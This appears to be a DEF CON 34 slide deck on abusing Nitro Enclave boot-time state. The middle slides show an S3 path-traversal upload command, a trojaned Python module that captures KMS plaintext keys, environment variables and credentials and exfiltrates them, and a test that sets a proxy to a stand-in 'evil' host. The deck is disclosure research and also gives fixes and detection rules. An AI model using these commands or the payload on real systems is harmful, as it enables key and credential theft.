---
title: "The Enclave is Lying to You Breaking TEE Trust Boundaries Through Boot-Time State"
speakers: ["Sandeep Jayashankar"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: null
source_pdf: "DEF CON 34/Sandeep Jayashankar - The Enclave is Lying to You Breaking TEE Trust Boundaries Through Boot-Time State - v1.pptx"
pages: 56
sha256: "6b112f37baa7b658becd8906497009903b6d5f13555838cff74cec87c5c4fa29"
text_chars: 30386
ocr_pages: 2
has_ocr: true
redacted_secrets: 1
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:40:53Z"
---
# The Enclave is Lying to You Breaking TEE Trust Boundaries Through Boot-Time State

**Speakers:** Sandeep Jayashankar  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/Sandeep Jayashankar - The Enclave is Lying to You Breaking TEE Trust Boundaries Through Boot-Time State - v1.pptx` (56 pages)

## Slide 1

## `D E F C O N 3 4 · M A I N S T A G E` **The Enclave Is Lying to You**

Breaking TEE Trust Boundaries Through Boot-Time State

```
Sandeep Jayashankargithub.com/pyro-0x
```

## Slide 2

`$ W H O A M I` **Sandeep Jayashankar**

Offensive Security & Cloud Adversarial Simulation

15+ years building and breaking cloud-native products and infrastructure Prior work: IAM privilege escalation, container escapes, serverless abuse Builder of untrust — an open-source TEE deployment scanner

This research: coordinated disclosure complete, fixes shipped in 8 weeks

```
THE ENCLAVE IS LYING TO YOU
```

```
INTRO · 02
```

## Slide 3

```
T H E S T A K E S
```

##### **The industry is auditing the hardware. The bugs are in the bash scripts.**

Confidential computing is the fastest-growing cloud security primitive — and every dollar of scrutiny goes to one side of the stack.

`W H A T E V E R Y O N E A U D I T S W H A T N O B O D Y A U D I T S` **The silicon The deployment layer** Attestation & PCR measurements `bootstrap.sh` Memory encryption Secure boot chain `#  provision runtime, then start enclave` Formal hardware review, papers, conferences `setup_networking mount_secrets /run/secrets export LOG_LEVEL=info exec /opt/enclave/run.sh` Millions in R&D. Years of scrutiny. Copy-pasted from a quickstart. Never reviewed.

```
THE ENCLAVE IS LYING TO YOU
```

```
INTRO · 03
```

## Slide 4

```
ACT I01 / 06
```

# **The Promise**

What confidential computing claims — and why the industry believes it. `I II III IV V VI`

## Slide 5

##### `A C T I · T H E P R O M I S E` **What does confidential computing promise?**

_"A fully compromised host cannot reach into a hardware-isolated enclave."_

```
— AWS Nitro Enclaves documentation
```

```
AWS Nitro Enclaves
```

- "Isolated compute to process highly sensitive data"

```
AMD SEV-SNP
```

"Hardware-enforced memory isolation from the hypervisor"

```
Intel TDX
```

- "Eliminate the need to trust the cloud provider"

`Azure Confidential` "Data-in-use protection for containerized workloads"

The marketing says the hardware will save you. The hardware is not the problem.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT I · 05
```

## Slide 6

```
A C T I · T H E P R O M I S E
```

##### **The TEE Trust Model**

```
untrusted · full root
```

```
sealed · attested
```

```
THE HOST
```

**`THE ENCLAVE`** Sealed memory · no SSH / console · attests its code — not its inputscode — not its inputs— not its inputsinputs

Launches the enclave · controls network + Sealed memory · no SSH / console · attests its code — not its inputscode — not its inputs— not its inputsinputs storage · reads every config file `U N T R U S T E D H O S T H A R D W A R E I S O L A T I O N E N C L A V E I N T E R I O R` **`0 1 0 2 0 3`** `Established by: Established by: Established by:` Nobody — assumed, not enforced Nitro hypervisor — AWS silicon KMS key policy `Mechanism: Mechanism: Mechanism:` IAM + OS hardening PCR attestation + vsock; memory sealed RecipientAttestation PCR pin + no-shell `Gap: Gap: Gap:` Fully attacker-controlled if CI/CD falls — Covers the code — not what's loaded into it Attestation binding is opt-in — most `s3:PutObject` is all it takes at boot deployments skip it

###### Boundary 2 holds.Boundaries 1 and 3 are only as good as your config

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT I · 06
```

## Slide 7

`A C T I · T H E P R O M I S E` **Attestation: what it covers**

**`PCR0`** Enclave image (EIF)

**`PCR1 PCR2 PCR8`** Linux kernel Application binary Signing certificate

The math is solid. Tamper with the binary → PCRs change → KMS refuses to decrypt. So how did we get root inside — without changing a single PCR value?

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT I · 07
```

## Slide 8

`A C T I · T H E P R O M I S E` **Attestation: what it does not cover**

Objects downloaded from cloud storage at boot Environment variables passed via vsock KMS key policy (opt-in, not default) Network bridge configuration Bootstrap scripts IAM role permissions

Environment variables passed via vsock

Network bridge configuration

Attestation says nothing about the data the code trusts. The code is correct. The inputs are poisoned.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT I · 08
```

## Slide 9

`A C T I · T H E P R O M I S E` **The mental model vs. reality**

`W H A T P E O P L E T H I N K` _"The enclave is isolated. Nothing can get in. Nothing can get out."_

`W H A T ' S A C T U A L L Y T R U E` _"The enclave is isolated after boot. During boot, it trusts the host completely — and the host is the threat model."_

The boot sequence is a window of total trust in an architecture designed for zero trust.

This isn't a bug in one product. It's a gap in how TEEs are deployed everywhere.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT I · 09
```

## Slide 10

```
A C T I · T H E P R O M I S E
```

##### **The gap**

Cloud security teams H A R D W A R E  B O O T - T I M E G A P R U N N I N G E N C L A V E
G U A R A N T E E
"It's hardware-isolated, what  S3 state Encrypted RAM
Sealed memory
could go wrong?"
env vars Attested code
Attestation integrity
KMS keys
Hardware / silicon teams
Isolation
Defends its code — but
"We provide attestation, use  Mutable inputs the PCRs never
inherits the unverified
it." Cryptographically measured  measure or cover.
inputs it was fed.
and enforced by the silicon.
Platform teams
TRUSTS ITS INPUTS
"We just follow the docs." COVERED BY ATTESTATION OUTSIDE ATTESTATION ANYWAY
No attestation. No verification. No protection.
The vendor docs
Hardware guarantee vs. deployment reality
Don't mention any of this.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT I · 10
```

## Slide 11

```
A C T I · T H E P R O M I S E
```

##### **Who's running TEE workloads? And what's inside?**

**Finance** `Card data, transaction signing` Payment processing, HSM-as-a-service

###### **`100%`**

**Crypto / DeFi**

```
Private keys, signing authority
```

MPC signing, key custody

**Healthcare** `PHI / PII at rest and in-use` Genomics, clinical data

**AI / ML** Model inference, training

`Model weights, training data` Model inference, training **Identity** `Fingerprints, face templates` Biometric processing

of these workloads exist specifically to protect the one asset they can't afford to lose. `T H E I R O N Y deploy.sh`

```
#  feeds the enclave every boot
aws s3 cp
s3://state  . -r
python launch.py
```

The scripts guarding the crown jewels are usually bash — copied from a quickstart guide.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT I · 11
```

## Slide 12

```
A C T I · T H E P R O M I S E
```

##### **Three platforms, same pattern**

|`PLATFORM`|`BOOTSTRAP SOUR`|`CE`|`ENV DELIVERY`|
`KMS ATTESTATION`|
|---|---|---|---|---|
|`Nitro Enclaves`|`S3 bucket`||`vsock proxy`|`Opt-in`|
|`SEV-SNP`|`Azure Blob /`|`managed disk`|`VMPL / vTPM`|`Opt-in`|
|`TDX`|`GCS bucket /`|`attached disk`|`TDVMCALL`|`Opt-in`|
|**`STEP 01`**|`VERIFIED`|**`STEP 02`**|`UNTRUSTED`|**`STEP 03`**
`NOT COVERED`|
|Boot from a hardwa|re-verified|Download mutable sta|te from|Attestation never covers Step 02|
|image||untrusted storage|||

Not a Nitro problem — a confidential computing deployment problem. We tested Nitro. The architecture is the same everywhere.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT I · 12
```

## Slide 13

`A C T I I 02 / 06` **The Gap** A real deployment, its boot-time inputs, and where the trust actually breaks.

```
IIIIIIIVVVI
```

## Slide 14

`A C T I I · T H E G A P` **Architecture of a real TEE deployment**

```
W H E R E T H E A T T A C K L A N D S
```

**`Steps 01 & 02`** Attacker-controlled inputs — read from the host and external storage, never attested. **`Step 03`** Trusts the poisoned input — the KMS MITM lands here.

The full boot sequence is in the diagram →

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT II · 14
```

## Slide 15

`A C T I I · T H E G A P` **Boot-time inputs: the unattested surface**

I N P U T S O U R C E A U T H E N T I C A T E D ? A T T E S T E D ?
Env vars Host → vsock NO NO
S3 state Cloud storage IAM ONLY NO
KMS key Key policy OPTIONAL USUALLY NOT
Network Host iptables NO NO
DNS Host DNAT NO NO

###### Five inputs. Zero attestation. All reach inside the enclave — its security depends entirely on things outside it.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT II · 15
```

## Slide 16

`A C T I I · T H E G A P` **Who can write to the enclave's state bucket?**

`s3:PutObject` on that one bucket is the entire entry requirement. So — who holds it?

```
CI/CD service accounts — GitHub Actions, GitLab CI, Deployment automation — Terraform, CloudFormation
Jenkins
Developer IAM users with broad s3:* policiesThird-party integrations — backup, monitoring agents
```

```
Or no credentials at all — a misconfigured bucket policy left world-writable
```

Principals who can write to that bucket in a typical account: dozens to hundreds. The enclave is only as strong as your weakest one.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT II · 16
```

## Slide 17

```
A C T I I · T H E G A P
```

##### **Threat model: where we attacked**

Seven boot-time inputs, attacked end to end.

4 3
held let us in

One of those becomes root inside the enclave.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT II · 17
```

## Slide 18

```
A C T I I · T H E G A P
```

##### **What was blocked**

**Env var injection**

```
BLOCKED
```

17 payloads — `$(cmd)` , backticks, `;` , pipes. Stopped by a 3-layer filter.

**DNS MITM + TLS bypass**

```
BLOCKED
```

iptables DNAT to an attacker IP. Stopped by certificate pinning.

**RPC fuzzing**

```
STABLE
```

10,000 random / malformed inputs. No crash — hardened deserialization.

**NTP manipulation** `NOT EXPLOITABLE` Time skew to expire / replay tokens. Defeated by a hardwarebacked clock.

**`4 / 7 vectors held.`** The builder got the hard parts right — input filtering, cert pinning, hardened RPC, and a hardware-backed time source.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT II · 18
```

## Slide 19

```
A C T I I · T H E G A P
```

##### **What was exploitable**

**KMS without attestation**

```
CRITICAL
```

**IMDS via NAT bridge**

```
HIGH
```

Key policy missing `RecipientAttestation` . Anyone with the IAM role decrypts — no enclave needed.

No iptables filter for `169.254.169.254` . Host IAM credentials stolen from inside the enclave.

But what if we could replace a file the enclave imports at boot?

It downloads state from S3 every boot — including Python modules the enclave imports at runtime. Overwrite one that's loaded during a KMS decrypt, and our code runs as root inside the enclave.

How do we get a file there? We only have `s3:PutObject` .

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT II · 19
```

## Slide 20

```
A C T I I · T H E G A P
```

**`../`** S3 stores object keys as opaque strings. It doesn't interpret paths. The enclave's download script writes them to the local filesystem — which does.

```
attacker@ops — bash
```

- `$ aws s3 cp payload.py "s3://bucket/state/../kms/kms_helper.py"`

S3 stores it literally. The filesystem resolves `../` on download. Our file lands at

`/opt/enclave/kms/kms_helper.py` — outside the state directory.

One command. One IAM permission. A path traversal from 1998 — against the most sophisticated hardware isolation money can buy.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT II · 20
```

## Slide 21

```
A C T I I · T H E G A P
```

The enclave trusts what the host feeds it. The host is the threat model.

**The entire TEE security model has a boot-time gap.** The hardware isolation is real. The deployment story defeats it. Every enclave that boots from untrusted state is only as secure as that state's storage. `THE ENCLAVE IS LYING TO YOU`

```
ACT II · 21
```

## Slide 22

`A C T I I I 03 / 06` **The Kill Chain**

One IAM permission to root inside the enclave. Eight steps, one command.

```
IIIIIIIVVVI
```

## Slide 23

```
A C T I I I · T H E K I L L C H A I N
```

##### **What you're about to see**

###### A real attack chain against a cryptographic signing service running in a Nitro Enclave.

Entry requirement Host access needed `s3:PutObject` — one IAM permission None. No SSH. No SSM. No console.

Files uploaded Trigger One — a Python module with a traversal path Next boot cycle — deploy, patch, crash, scale

```
R E S U L T
```

**Root + DB encryption key + IAM credentials**

`D E T E C T I O N` **PCR unchanged. No alerts fired.**

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT III · 23
```

## Slide 24

```
A C T I I I · T H E K I L L C H A I N
```

##### **The kill chain — overview**

`RECON TARGET WEAPONIZE` **`DELIVER`** `WAIT TRIGGER LOOT PERSIST` → → → `s3 cp ../` → → → → read config identify write payload next boot enclave boots keys + creds survives module one command reboot

```
Attacker effort: 1 command|Time: minutes|Detection: none
```

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT III · 24
```

## Slide 25

```
A C T I I I · S T E P 1
```

##### **Reconnaissance**

```
root@enclave-host — recon
```

```
# ls -la /opt/enclave/environment.conf -rw-r--r-- 1 root root 247 Jul  2 09:01
/opt/enclave/environment.conf # cat /opt/enclave/environment.conf BUCKET_NAME=enclave-state-
XXXXXXXXXXXX KEY_ARN=arn:aws:kms:us-west-2:XXXXXXXXXXXX:key/XXXXX PAIRING_TOKEN=dummy-already-paired
LOG_LEVEL=INFO BUCKET_COSIGNER_DIR=state
```

Permissions: 644 — world-readable. Any process on the host reads it. Now we know the bucket, the KMS key, and exactly where state lives.

In practice an attacker may not even need host access — bucket names follow predictable conventions, and S3 policies are often over-permissive.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT III · 25
```

## Slide 26

`A C T I I I · S T E P 2` **Identify the target module**

```
s3 state
```

```
enclave modules
```

```
$ aws s3 ls s3://…/ --recursive 4096  state/db.key # from the EIF manifest /opt/enclave/kms/kms_helper.py
32768 state/db/secrets.db 1247← decrypt /opt/enclave/kms/__init__.py
state/config/service.json/opt/enclave/app/main.py
```

Target: `kms_helper.py`

Imported every time the enclave decrypts a secret. Overwrite it, and our code runs during the next KMS operation.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT III · 26
```

## Slide 27

```
A C T I I I · S T E P 3
```

##### **Weaponize**

```
kms_helper.py — payload
```

```
import os, json, boto3defdecrypt_string (ciphertext):
```

```
# MITM: intercept the KMS decrypt, capture, pass through     resp = boto3.client("kms").decrypt(CiphertextBlob=ciphertext)
    plaintext = resp["Plaintext"]
```

```
_exfil ({"plaintext_hex": plaintext.hex()})
```

```
return plaintext   # app continues normally — no crashdef_collect ():
```

```
# harvest identity, env, encryption keys, credentials return {"id": os.popen("id").read(), "env": dict(os.environ)}
```

Invisible: it intercepts, exfiltrates, and passes through. The app never knows.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT III · 27
```

## Slide 28

```
A C T I I I · S T E P 4
```

##### **Deliver — one command**

```
attacker@ops — bash
```

- `$  aws s3 cp evil_simple.py \`

```
"s3://enclave-state-XXXX/state/../kms/kms_helper.py"upload:  ./evil_simple.py to
s3://enclave-state-XXXX/state/../kms/kms_helper.py
```

`W H E R E S 3 S T O R E S I T state/../kms/kms_helper.py` Stored literally — the key contains `../` .

`W H E R E T H E E N C L A V E W R I T E S I T /kms/kms_helper.py` Filesystem resolves `../` — escapes `state/` .

That's it. One command. One IAM permission. A path traversal from 1998 against hardware isolation from 2024.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT III · 28
```

## Slide 29

```
THE ENCLAVE IS LYING TO YOUACT III · 29
```

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
What S3 sees
No path interpretation.
$3 stores keys as opaque strings.
Bucket: my-enclave-artifacts
"../" has no special meaning to S3.
|
NS
Key Size
[=] state/db.key 1.2 KB
=| state/db/secrets.db 64 KB
=) state/ [BJ kms/kms_helper. py 11 KB
=) state/checkpoint. json 2.0 KB
=) state/logs/2025-05-20.1log 128 KB
| $3 treats the entire string as a literal key.
r
What the filesystem does on download
The OS resolves the path during write.
",." moves up one directory.
/opt/enclave/
@) Start at
pm atatel @----------- /opt/enclave/state/
i Ee db. key
, checkpoint. json ® Encounter "../”
! Go UP one level
y t+— logs/
aws s3 sync > \ L— db/
kms / ¢------------ ® Then go into
/opt/enclave/kms/
* Write kms_helper.py
— other/ i OVERWRITTEN!
-— config.yaml Laer @ Legitimate file
Ls README.md wv’ has been replaced.
The filesystem resolves the path.
The write lands OUTSIDE the state/ directory.
|
$3 stores it literally. The filesystem resolves it.
The file lands OUTSIDE the state directory.
THE ENCLAVE IS LYING TO YOU
ACT III
29
```

## Slide 30

```
A C T I I I · S T E P 5
```

##### **Wait for boot**

###### The attacker doesn't trigger the boot. They just wait.

```
Scheduled deployment — weekly / monthly, most common
```

```
Security patch cycle — patching triggers the exploit
```

```
Auto-scaling event — traffic spike = more compromised
instances
```

```
Crash recovery — systemd restarts the service
```

Average time to next boot: < 7 days. The payload sits in S3 indefinitely.

Fleet-wide impact: every instance that boots from this bucket is compromised. Auto-scaling = mass exploitation. Multiregion shared buckets: one write, global impact. This isn't "compromise one box" — it's compromise the source of truth.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT III · 30
```

## Slide 31

```
A C T I I I · S T E P 6
```

##### **Trigger — the enclave boots**

```
enclave-service — boot log
```

```
[bootstrap] Downloading state from S3 bucket 'enclave-state-XXXX'… [bootstrap]   Downloaded state/db.key
[bootstrap]   Downloaded state/../kms/kms_helper.py[bootstrap]  State download complete. Starting application…
[app] Loading KMS module from /opt/enclave/kms/kms_helper.py [app] Decrypting database key via KMS…
EXFIL_SUCCESS: uploaded to s3://enclave-state-XXXX/exfiltrated/dump.json KMS_MITM_SUCCESS: plaintext key
intercepted [app] Database key loaded. Starting RPC listener on vsock CID 100.
```

The bootstrap logs show the traversal path being downloaded. No alert fires. The app starts normally. Our code ran. Nobody noticed.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT III · 31
```

## Slide 32

```
A C T I I I · S T E P 7
```

##### **Loot — what we extracted**

```
exfiltrated/dump.json
```

```
{
"id": "uid=0(root) gid=0(root) groups=0(root)" ,
```

- `"hostname" : "enclave-i-0a1b2c3d4e5f67890", "env" : {`

```
"BUCKET_NAME" : "enclave-state-XXXXXXXXXXXX",
```

```
"KEY_ARN" : "arn:aws:kms:us-west-2:XXXX:key/XXXXX",
```

```
"AWS_ACCESS_KEY_ID": "ASIA[REDACTED:aws-access-key-id]" ,
```

```
"AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7…EXAMPLEKEY" ,
```

- `"AWS_SESSION_TOKEN": "IQoJb3JpZ2luX2VjEBYa…"   },`

```
"/tmp/db.key": "a7e3f19b42d8c056e1b4f27a8c3d6e90…" }
```

Root. Inside the hardware-isolated enclave. With its own IAM credentials — and the database encryption key.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT III · 32
```

## Slide 33

`A C T I I I · S T E P 7 B` **The KMS MITM — plaintext key capture**

```
exfiltrated/kms_mitm.json
```

```
{
"attack" : "KMS decrypt intercepted inside Nitro Enclave",
```

- `"plaintext_hex": "6158627c25e11907234763691b6e9b6d" ,`

- `"plaintext_length": 16 ,`

- `"encryption_algorithm" : "SYMMETRIC_DEFAULT" }`

16 bytes. AES-128. The database encryption key. In plaintext.

The enclave decrypted its own secret — through our code. No error. No crash. No timeout. With this key, the attacker decrypts the secrets database offline, forever.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT III · 33
```

## Slide 34

```
A C T I I I · S T E P 8
```

##### **Attestation check — the punchline**

- `enclave — before attack enclave — after exploit`

- `$ nitro-cli describe-eif | jq -r .Measurements.PCR0 $ nitro-cli describe-eif | jq -r .Measurements.PCR0 8b3f42a7c1d9e056f3a28d7c4e5b9f10a2c4d6e8f0b1a3c5d7e9f0b 8b3f42a7c1d9e056f3a28d7c4e5b9f10a2c4d6e8f0b1a3c5d7e9f0b 2a4c6d8e0 2a4c6d8e0`

```
PCR0 UNCHANGEDATTESTATION: VALID
```

###### We didn't modify the enclave image. We modified what it downloads.

PCR values hash the code — not the data. Attestation says "the binary is correct." It's right. The binary just loaded our module instead of the real one.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT III · 34
```

## Slide 35

```
THE ENCLAVE IS LYING TO YOUACT III · 35
```

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WHAT ATTESTATION SEES WHAT’S ACTUALLY INSIDE
PCRO: 8b3f42a7c1d9e056... YW Running as: root (uid=0)
PCR1: 52b919754e1643... A Attacker code: EXECUTING
PCR2: d14a28d75e0d7... A db.key: EXFILTRATED
IAM credentials: STOLEN
Image: VALID :
KMS plaintext: CAPTURED
Kernel: VALID ;
Application: VALID Detection: NONE
| ATTESTATION: PASSED | | STATE: COMPROMISED |
' | Same enclave. :
Racers weciens nat J Same: PGR WOLUGS bes enrese crores werent '
Same attestation |
document. |
Attestation proves the CODE is correct.
It says nothing about the DATA the code loaded.
THE ENCLAVE IS LYING TO YOU ACT III : 35
```

## Slide 36

For a crypto custody service moving $5M+/day, the gap between "key theft" and "fund theft" is a few lines of Python.

```
THE ENCLAVE IS LYING TO YOUACT III · 36
```

## Slide 37

- `A C T I I I · T H E K I L L C H A I N` ▶ `FULL RUN — NO CUTS`

- **The whole chain — one terminal, no cuts**

Everything you just saw, uncut — one command to root, keys, and credentials.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT III · 37
```

## Slide 38

### **Pause.**

```
One IAM permission. One file. A path traversal from 1998.
```

```
Attestation: VALID
```

```
Enclave state: COMPROMISED
Root, keys, credentials: EXFILTRATED
```

```
The enclave is still running. Nobody knows.
THE ENCLAVE IS LYING TO YOU
```

```
ACT III · 38
```

## Slide 39

`A C T I I I · T H E K I L L C H A I N` **Supply chain comparison**

SolarWinds needed months of social engineering. This needs one aws s3 cp.

Same blast radius. Same persistence. But attestation stays unchanged — no signature diff to catch.

This is a supply chain attack on the boottime data plane.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT III · 39
```

## Slide 40

`A C T I V 04 / 06` **The Silence**

Every step of that attack — and why none of it shows up in your logs. `I II III IV V VI`

## Slide 41

`A C T I V · T H E S I L E N C E` **What the attack looks like in CloudTrail**

```
cloudtrail — event
```

```
{
"eventName" : "PutObject",
"userIdentity" : {
"type" : "AssumedRole",
"arn": "arn:aws:sts::XXXX:assumed-role/ci-deploy-role /session"
  },
"requestParameters" : {
"bucketName" : "enclave-state-XXXX",
"key": "state/../kms/kms_helper.py"   },
"sourceIPAddress" : "198.51.100.42"
}
```

One log entry. Looks like a normal deployment artifact upload. No alert fires unless you're specifically looking for `../` in S3 keys.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT IV · 41
```

## Slide 42

```
A C T I V · T H E S I L E N C E
```

##### **What doesn't get logged**

|`A T T A C K E R A C T I O N`|`C L O U D T R A I L`|`G U A R D D U T Y`|`E D R / H O S T A G E N T`|
|---|---|---|---|
||control-plane only|no behavioral IOC|can't see sealed RAM|
|S3 PutObject with`../`|`◐ if data events`|`✗`|`✗`|
|Enclave downloads the file|`✗`|`✗`|`✗`|
|Path traversal resolves|`✗`|`✗`|`✗`|
|Module overwrite inside|`✗sealed`|`✗`|`✗`|
|KMS MITM inside|`✗legit call`|`✗`|`✗`|
|Exfil via S3 PutObject|`◐ expected role`|`✗`|`✗`|
|**`16/18`**
detection cellsblind
leave a trace, and b|.Once code runs inside sealed memo
oth look like routine deploys.|ry —no EDR, no strace, no observa|bility.Only the two S3 bookends|

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT IV · 42
```

## Slide 43

`A C T I V · T H E S I L E N C E` **Detection opportunities**

`1 · S3 key anomaly` PutObject where key contains `../` or `..\\` → CloudTrail → EventBridge alert

- `2 · New files in bucket` PutObject to keys not in the expected manifest

- `3 · S3 versioning + object lock` Alert on overwrites of existing state objects

- `4 · Enclave IAM anomaly` Role does PutObject to unexpected keys (exfil)

- `5 · KMS decrypt frequency` Baseline per boot, alert on spikes

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT IV · 43
```

## Slide 44

`A C T V 05 / 06` **The Fix**

What actually closes the gap — and how the vendor shipped it in eight weeks.

```
IIIIIIIVVVI
```

## Slide 45

```
A C T V · T H E F I X
```

##### **"But why not just sign the S3 objects?"**

|`APPROACH`|`WORKS?`|`PROBLEM`|
|---|---|---|
|`S3 server-side encryption`|`✗`|`Anyone with GetObject reads plaintext`|
|`S3 checksums (SHA256)`|`~`|`Catches corruption, not replacement`|
|`Code-signed manifests`|`✓`|`Enclave must carry the verification key in-image`|
|`Attestation-conditioned KMS`|`✓`|`Only the real enclave can decrypt state`|
|Best answer:encrypt state with a|KMS key requi|ring PCR attestation to decrypt.|

The enclave is the only entity that can unwrap the state. Even if S3 is poisoned, the data is useless without the enclave's attestation.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT V · 45
```

## Slide 46

```
A C T V · T H E F I X
```

##### **The fix — shipped 8 weeks later**

```
download_state_secure.py
```

`def download_state_secure (bucket, prefix, local_dir): allowed = load_allowlist("/opt/enclave/expected_files.txt") for obj in  s3.list_objects_v2(Bucket=bucket, Prefix=prefix)["Contents"]: key = obj["Key"] normalized = os.path.normpath(os.path.relpath(key, prefix)) if ".." in normalized.split(os.sep):   # traversal raise  SecurityError(f"Path traversal: {key}") if normalized not in allowed:            # allowlist continue         dest = os.path.realpath(os.path.join(local_dir, normalized)) if not  dest.startswith(os.path.realpath(local_dir)): raise SecurityError(f"Boundary escape: {dest}")   # ← key check         s3.download_file(bucket, key, dest) S H I P P E D B Y T H E V E N D O R O W N E D B Y T H E O P E R A T O R` Hardened download path + attestation-gated KMS, baked into the enclave Lock down bucket IAM, filter IMDS at the bridge, enable versioning + audit. image. Live in a subsequent build. Config outside the image.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT V · 46
```

## Slide 47

```
A C T V · T H E F I X
```

##### `VENDOR-SHIPPED` **The complete fix — 8 layers**

|`#`|`LAYER`|`CATCHES`|
|---|---|---|
|`1`|`File allowlist`|`Unknown filenames rejected`|
|`2`|`Path normalization`|`normpath(relpath()) collapses traversals`|
|`3`|`Traversal detection`|`.. in components = reject`|
|`4`|`Backslash rejection`|`Blocks \\ (Windows traversal)`|
|`5`|`Absolute path rejection`|`Blocks /etc/passwd keys`|
|`6`|`Null byte rejection`|`Blocks \\x00 truncation`|
|`7`|`Boundary check`|`realpath() must stay in dir`|
|`8`|`No-overwrite`|`lexists() blocks symlink races`|
|An|y single layer blocks the attack.|Together: comprehensive.|

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT V · 47
```

## Slide 48

```
A C T V · T H E F I X
```

##### `OPERATOR-OWNED` **KMS policy fix — enforce attestation**

|`before — vulnerable`|`after — hardened`|
|---|---|
|`"Action": "kms:*", "Resource": "*"`|`{`|
||`"Action": ["kms:Decrypt"],`|
||`"Condition": {`|
||`"StringEqualsIgnoreCase": {`|
||`"kms:RecipientAttestation:PCR0": "8b3f42a7…",`|
||`"kms:RecipientAttestation:PCR1": "52b91975…",`
`"kms:RecipientAttestation:PCR2": "d14a28d7…"    }`
`}`
`}`|

Now only the exact enclave image can call KMS Decrypt. PCR values come from `nitro-cli build-enclave` — pin them, update on each release.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT V · 48
```

## Slide 49

```
A C T V · T H E F I X
```

##### **5 checks to run Monday morning**

|`#`
`CHECK`|`ONE-LINER TEST`|
|---|---|
|`1`
`Path traversal`|`Upload prefix/../../tmp/canary → reboot → does /tmp/canary exist?`|
|`2`
`KMS attestation`|`get-key-policy → grep RecipientAttestation → empty = vulnerable`|
|`3`
`IMDS egress`|`iptables -L FORWARD → grep 169.254.169.254 → no DROP = vulnerable`|
|`4`
`Env validation`|`Set HTTPS_PROXY=http://evil → reboot → does it proxy?`|
|`5`
`Audit trail`|`get-bucket-versioning → not Enabled = blind`|
|Or just rununtrust scan—|it checks all five and more ..|

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT V · 49
```

## Slide 50

```
A C T V · T H E F I X
```

##### **untrust — open-source TEE scanner**

|`bash`|||
|---|---|---|
|`$ pip install untrus`
`--kms-key-id arn`|`t$  untrust scan --target-bucket enclave-state-XXXX \`
`:aws:kms:…:key/abc123 --instance-id i-0abc123`||
|`CHECK`|`WHAT IT TESTS`|`SEVERITY`|
|`BOOTSTRAP-01`|`../canary upload → path escape?`|`Critical`|
|`KMS-01`|`Key policy has RecipientAttestation?`|`High`|
|`NAT-01`|`iptables IMDS drop rule?`|`Medium`|
|`ENV-01`|`Fuzz env delivery with injection payloads`|`Medium`|
|`AUDIT-01`|`S3 versioning + CloudTrail data events?`|`Low`|
|github.com/pyro-0x
`THE ENCLAVE IS LY`|/untrust— Nitro today; SEV-SNP and TDX on the roadmap.
`ING TO YOU`|`ACT V · 50`|

## Slide 51

- `LIVE SCAN`

`A C T V · T H E F I X`  `LIVE SCAN` **Point it at the target we just rooted**

One command against the live deployment — the same five findings, flagged in seconds.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT V · 51
```

## Slide 52

```
A C T V · T H E F I X
```

##### **Disclosure timeline**

MAR 2026 MAR 2026 APR 2026 APR 2026
Vulnerabilities identified  Vendor notified —  Fixed build shipped to  Fix verified — all issues
during an authorized  coordinated disclosure ;  production resolved
simulation remediation begins
No CVE assigned — coordinated disclosure, fixed server-side Vendor response professional and fast
Fixes comprehensive
THE ENCLAVE IS LYING TO YOU ACT V · 52

## Slide 53

`A C T V I 06 / 06` **The Lesson**

Zoom back out: what really broke, and what everyone should take home. `I II III IV V VI`

## Slide 54

`A C T V I · T H E L E S S O N` **The hardware did its job. The deployment didn't.**

Let's be fair to the silicon — it did exactly what it promised.

✓ Attestation — PCRs cryptographically sound ✓ Memory isolation — no side-channel leakage ✓ No SSH, no debug, no console ✓ Sealed execution environment is real

Nobody broke the crypto. Nobody broke the silicon. The vulnerability class is in what the TEE trusts — and it's the industry default.

```
THE ENCLAVE IS LYING TO YOU
```

```
ACT VI · 53
```

## Slide 55

##### `A C T V I · T H E L E S S O N` **Confidential computing is a deployment problem dressed up as a hardware problem.**

Attestation covers the code — it says nothing about the data the code trusts. Every TEE that boots from unattested state inherits this gap: Nitro, SEV-SNP, TDX.

